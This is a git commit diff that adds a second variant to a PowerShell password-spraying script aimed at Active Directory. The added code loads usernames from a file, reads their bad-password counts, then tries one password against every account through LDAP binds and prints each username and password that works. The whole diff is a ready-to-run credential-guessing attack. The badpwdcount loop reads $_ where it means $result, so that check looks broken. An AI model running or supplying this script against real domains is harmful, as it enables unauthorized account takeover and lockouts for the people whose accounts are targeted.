33dafbe87e532e4d3bfa569e31cbc29b63d664dc
ville87 <38942588+ville87@users.noreply.github.com>
2024-12-10 15:17:54 +0200

    Update powershell_pwspray.ps1

--- Windows/powershell_pwspray.ps1
+++ Windows/powershell_pwspray.ps1
@@ -17,3 +17,36 @@ foreach($user in $userlist){
 
 # Check bad password attempt count:
 # ([adsisearcher]"(&(ObjectCategory=Person)(ObjectClass=User))").FindAll() | % {write-host $_.Properties['name'] "--->" $_.Properties['badpwdcount'] }
+
+# Variant 2: Working with users from files
+$userlistfile = Read-Host "Provide the full path to the file with the users you want to spray"
+$userlist = Get-Content $userlistfile
+$password = Read-Host "Provide the password you want to test"
+$Domain = $env:userdnsdomain
+$CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
+$count = $UserList.count
+# First we get the badpwdcount for those users and ask to continue...
+Write-Host "Getting badpwdcount value for those users..."
+$objects = @()
+foreach($user in $userlist){
+	$result = ([adsisearcher]"(&(ObjectCategory=Person)(ObjectClass=User)(samaccountname=$user))").FindAll() 
+	$data = [PSCustomObject]@{
+		samaccountname = $($_.Properties['samaccountname'])
+		badpwdcount = $($_.Properties['badpwdcount'])
+	}
+	$objects += $data
+}
+Write-Host "Found the following badpwdcount values for the given users:"
+$objects | ft
+
+Read-Host -Prompt "Press any key to do the spraying or CTRL+C to quit" |out-null
+ 
+Write-Host "[*] Now trying password $password against $count users."
+foreach($user in $userlist){
+    $checkdomain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$user,$password)
+    if ($checkdomain.name -ne $null)
+    {
+        Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
+    }
+}
+
